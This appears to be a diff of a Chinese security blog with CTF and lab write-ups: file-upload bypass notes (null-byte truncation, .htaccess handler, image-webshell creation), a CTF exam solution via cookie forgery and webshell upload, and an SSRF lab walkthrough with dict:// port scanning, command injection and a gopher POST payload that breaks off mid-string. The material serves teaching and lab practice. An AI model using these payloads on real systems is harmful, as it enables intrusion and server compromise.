-<p>.phtml</p>
-<p>.phar</p>
-<p>.php5</p>
-<p>.php7</p>
-<p>00截断</p>
-<p>利用条件</p>
-<p>配置文件关闭魔法引号</p>
-<p>php版本&lt;5.3</p>
-<p>上传路径可控</p>
-<p>原理</p>
-<p>php会将%00认为字符串的结尾</p>
-<p>双写</p>
-<p>图片马</p>
-<p>图片马生成</p>
-<p>图片马利用条件</p>
-<p>能够解析</p>
-<p>文件包含漏洞</p>
-<p>对抗压缩</p>
-<p>条件竞争</p>
-<p>php写文件</p>
-<p>apache</p>
-<p>修改配置文件，使其解析其他内容</p>
+        <h2><span id="题目1">题目1</span></h2><p>555不是管理员</p>
+<p><img src="/../assets/image_1735884082921_0.png" alt="image.png"></p>
+<p>看了看曲奇饼，发现是base64的用户名，直接伪造一个</p>
+<p><img src="/../assets/image_1735884097807_0.png" alt="image.png"></p>
+<p>反弹个shell拿flag</p>
+<p><code>flag&#123;4833f846682676c86360fa717f423c88&#125;</code></p>
+<h2><span id="题目2">题目2</span></h2><p>早知道还是原道，直接购买-10000个原道，商家给了返利，含泪买下flag</p>
+<p><img src="/../assets/image_1735883456624_0.png" alt="image.png"></p>
+<p><code>flag&#123;fb5c50b9dda4ddacaedf622878199ebc&#125;</code></p>
+<h2><span id="题目3">题目3</span></h2><p>扫到了admin.php</p>
+<p><img src="/../assets/image_1735889313448_0.png" alt="image.png"></p>
+<p>但是得登陆，俺登陆不上去</p>
+<p>尝试万能密码</p>
+<p><img src="/../assets/image_1735891183438_0.png" alt="image.png"></p>
+<p>发现admin.php能看了</p>
+<p><img src="/../assets/image_1735888946856_0.png" alt="image.png"></p>
+<p><code>flag&#123;b6acd4cdd256c54704b09f12c1585a51&#125;</code></p>
+<h2><span id="题目4">题目4</span></h2><p>猜不到密码改改曲奇饼</p>
+<p><img src="/../assets/image_1735884477116_0.png" alt="image.png"></p>
+<p>看看upload.php的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//session_start();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// 检查用户是否登录</span></span><br><span class="line"><span class="comment">//if (!isset($_SESSION[&#x27;user_id&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    header(&quot;Location: login.php&quot;);</span></span><br><span class="line"><span class="comment">//    exit();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;is_login&quot;</span>] == <span class="string">&quot;false&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义上传文件的目标目录</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 🐮🍺 🐮🍺 🐮🍺 🐮🍺 🐮🍺 🐮🍺</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Ymd&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">000</span>,<span class="number">999</span>).<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$target_file</span>, PATHINFO_EXTENSION));</span><br><span class="line">    <span class="comment">// 检查文件大小（限制 5MB）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">5000000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 只允许特定类型的文件上传</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;jpeg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,  files are allowed.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查 $uploadOk 是否为 0（表示文件上传失败）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试上传文件</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;fileToUpload&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The file has been uploaded.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;includes/header.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;文件上传&lt;/h2&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    选择一个文件上传&lt;br/&gt;</span><br><span class="line">    &lt;p style=<span class="string">&quot;color: red&quot;</span>&gt;提示：flag文件在 /flag.txt&lt;/p&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;fileToUpload&quot;</span> id=<span class="string">&quot;fileToUpload&quot;</span> required&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload File&quot;</span>&gt;上传&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;includes/footer.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得爆破，开干</p>
+<p><img src="/../assets/image_1735885042570_0.png" alt="image.png"></p>
+<blockquote>
+<p>这个写错了，实际上文件应该长得这样<code>年月日xxxfilename</code><br>          xxx为000-999,filename为文件名</p>
+</blockquote>
+<p>上传zip使用phar解析，使用蚂剑连接</p>
+<p><img src="/../assets/image_1735889217404_0.png" alt="image.png"></p>
+<p>添加曲奇饼，结束</p>
+<p><code>flag&#123;e723e6038bc25659e0675ba068e041a2&#125;</code></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/20/day29_kls/" data-id="cm5vste54001hfriweetg8hd2" data-title="day29_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/03/week8_kls_exam/" data-id="cm6z08or9003vy1iw5a9d9yu9" data-title="week8_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
-
     </footer>
   </div>
   
@@ -449,10 +577,10 @@
 
 
   
-    <article id="post-upload-labs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-ssrf-vuls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/12/20/upload-labs/" class="article-date">
-  <time class="dt-published" datetime="2024-12-19T16:28:13.000Z" itemprop="datePublished">2024-12-20</time>
+    <a href="/2024/12/30/ssrf-vuls/" class="article-date">
+  <time class="dt-published" datetime="2024-12-30T15:27:52.000Z" itemprop="datePublished">2024-12-30</time>
 </a>
     
   <div class="article-category">
@@ -467,7 +595,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/20/upload-labs/">upload-labs</a>
+      <a class="p-name article-title" href="/2024/12/30/ssrf-vuls/">ssrf-vuls</a>
     </h1>
   
 
@@ -475,40 +603,99 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2><span id="搭建">搭建</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">去gayhub下载，精简包</span><br></pre></td></tr></table></figure>
+        <h2><span id="搭建">搭建</span></h2><p>docker-compose.yml</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">ssrf_v:</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">         <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line">          <span class="attr">gateway:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.1</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ssrfweb1:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="number">8088</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.21</span></span><br><span class="line">  <span class="attr">ssrfweb2:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v2</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.22</span></span><br><span class="line">  <span class="attr">ssrfweb3:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v3</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.23</span></span><br><span class="line">  <span class="attr">ssrfweb4:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v4</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.24</span></span><br><span class="line">  <span class="attr">ssrfweb5:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v5</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.25</span></span><br><span class="line">  <span class="attr">ssrfweb6:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v6</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.26</span></span><br><span class="line">  <span class="attr">ssrfweb7:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v7</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">ssrf_v:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">172.72</span><span class="number">.23</span><span class="number">.27</span></span><br></pre></td></tr></table></figure>
 
-<h2><span id="过关">过关</span></h2><h3><span id="关卡1">关卡1</span></h3><p>没什么好说的，js校验，栓条狗都能</p>
-<h3><span id="关卡2">关卡2</span></h3><p>MIME类型绕过，bp抓包，一抓一个准</p>
-<h3><span id="关卡3">关卡3</span></h3><p>未严格校验，传<code>phtml</code></p>
-<h3><span id="关卡4">关卡4</span></h3><p>中间件是apache,我们上传<code>.htaccess</code>和<code>shell.png</code>让apache解析png</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sethandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<h2><span id="介绍">介绍</span></h2><p>国光大佬的ssrf靶场。</p>
+<p>共7个服务，1个外网，6个内网。</p>
+<h2><span id="过关">过关</span></h2><h3><span id="web1">web1</span></h3><p>只有一个框，我们尝试一下实现正常功能</p>
+<p><img src="/../assets/image_1735222015850_0.png" alt="image.png"></p>
+<p><img src="/../assets/2024-12-26_22-08_1735222100831_0.jpg" alt="2024-12-26_22-08.jpg"></p>
+<p>存在ssrf,尝试读取本地文件</p>
+<p><img src="/../assets/image_1735222131597_0.png" alt="image.png"></p>
+<p>获取flag</p>
+<p><img src="/../assets/image_1735222152953_0.png" alt="image.png"></p>
+<p>flag:<code>This is flag</code></p>
+<h3><span id="其余关卡的过关准备">其余关卡的过关准备</span></h3><p>存在6个内网靶机，访问不到，一切未知。我们尝试通过ssrf进行内网探测。</p>
+<h4><span id="探测前的准备">探测前的准备</span></h4><p>本机的ip</p>
+<p>获取ip的意义是获取c段网络地址</p>
+<p>读取<code>/etc/hosts</code>或<code>/proc/net/arp</code>或<code>/proc/net/fib_trie</code>获取本机ip</p>
+<p><img src="/../assets/image_1735224074035_0.png" alt="image.png"></p>
+<p>显而易见，当前c段网络地址为<code>172.72.23.0</code></p>
+<p>dict探测端口</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;</span><br></pre></td></tr></table></figure>
 
-<h3><span id="关卡5-9">关卡5-9</span></h3><p>待定，后面写</p>
-<h3><span id="关卡10">关卡10</span></h3><p>垃圾的双写</p>
-<h3><span id="关卡11-12">关卡11-12</span></h3><p>00截断，错误的php配置，会将<code>00(ASCII)</code>认为是文件的结束。</p>
-<p>当上传文件带路径时，php会将<code>abc/a.php%00photo.png</code>认为是<code>abc/a.php</code></p>
-<h3><span id="关卡13-16">关卡13-16</span></h3><p>图片马，前提是存在文件解析漏洞，或文件包含漏洞，通过这些漏洞将图片解析为php</p>
-<p>生成图片马</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat pic.png shell.php &gt; webshell.png</span><br></pre></td></tr></table></figure>
+<h4><span id="端口探测">端口探测</span></h4><p>实际上在本靶场中，我们无法得知，这里我们选择爆破c段ip的常见端口。</p>
+<p>使用bp进行爆破</p>
+<p>配置爆破参数</p>
+<p><img src="/../assets/image_1735224234446_0.png" alt="image.png"></p>
+<p>paylaod1 c段ip</p>
+<p><img src="/../assets/image_1735224267341_0.png" alt="image.png"></p>
+<p>payload2 top100常见端口</p>
+<p><img src="/../assets/image_1735224324889_0.png" alt="image.png"></p>
+<p>开干，这个步骤可以整个py脚本过滤掉回显位置为空的地方。</p>
+<p>这是我们搜索到的结果</p>
+<p><img src="/../assets/image_1735225852232_0.png" alt="image.png"></p>
+<p>我们快速进行获取paylaod</p>
+<p>选中这些探测成功的payload,导出</p>
+<p><img src="/../assets/image_1735225955881_0.png" alt="image.png"></p>
+<p>注意要取消选择这个base64-encode</p>
+<p>从导出文件中提取信息</p>
+<p><img src="/../assets/image_1735226035026_0.png" alt="image.png"></p>
+<h4><span id="扫描结果">扫描结果</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">url=dict%3A%2F%2F172.72.23.22%3A80]]&gt;&lt;/request&gt;</span><br><span class="line">url=dict%3A%2F%2F172.72.23.23%3A80]]&gt;&lt;/request&gt;</span><br><span class="line">url=dict%3A%2F%2F172.72.23.24%3A80]]&gt;&lt;/request&gt;</span><br><span class="line">url=dict%3A%2F%2F172.72.23.25%3A80]]&gt;&lt;/request&gt;</span><br><span class="line">url=dict%3A%2F%2F172.72.23.26%3A8080]]&gt;&lt;/request&gt;</span><br><span class="line">url=dict%3A%2F%2F172.72.23.27%3A6379]]&gt;&lt;/request&gt;</span><br></pre></td></tr></table></figure>
 
-<p>压缩的图片马</p>
-<p>这个生成俺不会</p>
-<h3><span id="关卡17">关卡17</span></h3><p>条件竞争，校验逻辑错误的将文件临时存储起来时，这时我们碰巧访问到该文件，则会执行</p>
-<p>便捷的请求方式</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while true; do</span><br><span class="line">	curl xxx</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<h3><span id="内网1721722322">内网172.172.23.22</span></h3><p>访问发现是一个啥也没有的页面</p>
+<p><img src="/../assets/image_1735524089765_0.png" alt="image.png"></p>
+<p>尝试一下目录扫描，这里字典使用的是dirsearch的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u &quot;http://localhost:8088/&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;url=http%3A%2F%2F172.72.23.22%2FFUZZ&quot; -w dicc.txt  -fw 0-413</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>注意，不要将curl放到后台运行，会卡，如果非要，那么建议指定次数</p>
-</blockquote>
+<p>扫描结果如下</p>
+<p><img src="/../assets/image_1735524196090_0.png" alt="image.png"></p>
+<p>我们挨个访问，发现<code>phpinfo.php</code>,<code>shell.php</code>是存在的</p>
+<p><code>shell.php</code>可以直接getshell</p>
+<p><img src="/../assets/image_1735524771181_0.png" alt="image.png"></p>
+<h3><span id="内网172722323">内网172.72.23.23</span></h3><p>告诉俺存在sql注入</p>
+<p><img src="/../assets/image_1735524866686_0.png" alt="image.png"></p>
+<h3><span id="内网172722324">内网172.72.23.24</span></h3><p>一眼存在命令执行，但是他这个表单提交时是POST</p>
+<p><img src="/../assets/image_1735526220503_0.png" alt="image.png"></p>
+<p>使用<code>gopher</code>协议</p>
+<p><code>gopher://[host]:[port]/[type][selector]</code></p>
+<p>浅浅构造一个post包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 172.72.23.24</span><br><span class="line">Content-Length: 15</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.2.183:8088</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.2.183:8088/</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ip=127.0.0.1;id</span><br></pre></td></tr></table></figure>
+
+<p>将其进行二次url编码拼接到gopher后即可</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:%2f%2f172.72.23.24:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%37%25%33%32%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%31%25%33%35%25%30%64%25%30%61%25%34%33%25%36%31%25%36%33%25%36%38%25%36%35%25%32%64%25%34%33%25%36%66%25%36%65%25%37%34%25%37%32%25%36%66%25%36%63%25%33%61%25%32%30%25%36%64%25%36%31%25%37%38%25%32%64%25%36%31%25%36%37%25%36%35%25%33%64%25%33%30%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%37%61%25%36%38%25%32%64%25%34%33%25%34%65%25%32%63%25%37%61%25%36%38%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%30%64%25%30%61%25%34%66%25%37%32%25%36%39%25%36%37%25%36%39%25%36%65%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%32%25%32%65%25%33%31%25%33%38%25%33%33%25%33%61%25%33%38%25%33%30%25%33%38%25%33%38%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%35%35%25%37%30%25%36%37%25%37%32%25%36%31%25%36%34%25%36%35%25%32%64%25%34%39%25%36%65%25%37%33%25%36%35%25%36%33%25%37%35%25%37%32%25%36%35%25%32%64%25%35%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%37%33%25%33%61%25%32%30%25%33%31%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%31%25%33%30%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%32%39%25%32%30%25%34%31%25%37%30%25%37%30%25%36%63%25%36%35%25%35%37%25%36%35%25%36%32%25%34%62%25%36%39%25%37%34%25%32%66%25%33%35%25%33%33%25%33%37%25%32%65%25%33%33%25%33%36%25%32%30%25%32%38%25%34%62%25%34%38%25%35%34%25%34%64%25%34%63%25%32%63%25%32%30%25%36%63%25%36%39%25%36%62%25%36%35%25%32%30%25%34%37%25%36%35%25%36%33%25%36%62%25%36%66%25%32%39%25%32%30%25%34%33%25%36%38%25%37%32%25%36%66%25%36%64%25%36%35%25%32%66%25%33%31%25%33%33%25%33%31%25%32%65%25%33%30%25%32%65%25%33%36%25%33%37%25%33%37%25%33%38%25%32%65%25%33%38%25%33%36%25%32%30%25%35%33%25%36%31%25%36%36%25%36%31%25%37%32%25%36%39%25%32%66%25%33%35%25%33%33%25%33%37%25%32%65%25%33%33%25%33%36%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%